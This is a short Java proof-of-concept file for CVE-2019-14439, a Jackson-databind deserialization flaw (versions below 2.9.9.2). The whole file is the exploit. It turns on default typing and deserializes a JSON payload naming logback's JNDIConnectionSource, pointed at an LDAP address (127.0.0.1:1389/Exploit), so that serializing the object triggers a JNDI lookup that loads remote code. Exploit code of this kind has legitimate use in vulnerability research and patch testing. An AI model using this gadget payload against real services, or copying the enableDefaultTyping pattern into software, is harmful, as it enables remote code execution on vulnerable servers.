package com.test.jackson;

import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;

/**
 * logback jndi rce jackson < 2.9.9.2
 *
 * CVE-2019-14439
 *
 */

public class CVE_2019_14439 {
    public static void main(String[] args) throws Exception {
        String payload= "[\"ch.qos.logback.core.db.JNDIConnectionSource\",{\"jndiLocation\":\"ldap://127.0.0.1:1389/Exploit\"}]";

        ObjectMapper mapper = new ObjectMapper();

        mapper.enableDefaultTyping();

        Object o = mapper.readValue(payload, Object.class);

        mapper.writeValueAsString(o);
    }
}
